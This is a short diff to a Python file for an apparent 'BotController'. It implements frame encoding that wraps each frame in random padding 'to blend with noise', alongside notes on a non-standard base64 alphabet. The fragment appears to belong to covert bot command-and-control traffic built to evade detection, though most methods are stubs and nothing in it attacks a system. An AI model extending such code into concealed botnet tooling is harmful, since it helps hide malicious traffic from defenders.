@@ -4,6 +4,8 @@ from datetime import datetime, timedelta
 import base64
 import struct # for binary packing/unpacking
 import zlib
+import os
+import random
 
 # Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
 from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
@@ -39,7 +41,7 @@ The validation / authenticion logic has the following function:
 
     Encoding:
     - Non-standard base64 alphabet
-    - XOR stream with rotating key
+    - Padding with random bytes before and after the frame to blend with noise
 
 '''
 
@@ -116,8 +118,16 @@ class BotController:
         )
 
     
-    def _encode_frame(self):
-        pass
+    def _encode_frame(self, frame: bytes) -> bytes:
+        # blend with the noise
+        pad_before = random.randint(0, 16)
+        pad_after = random.randint(0, 16)
+
+        prefix = os.urandom(pad_before)
+        suffix = os.urandom(pad_after)
+
+        blend_frame = prefix + frame + suffix
+        return blend_frame
 
     def _publish_frame(self):
         pass
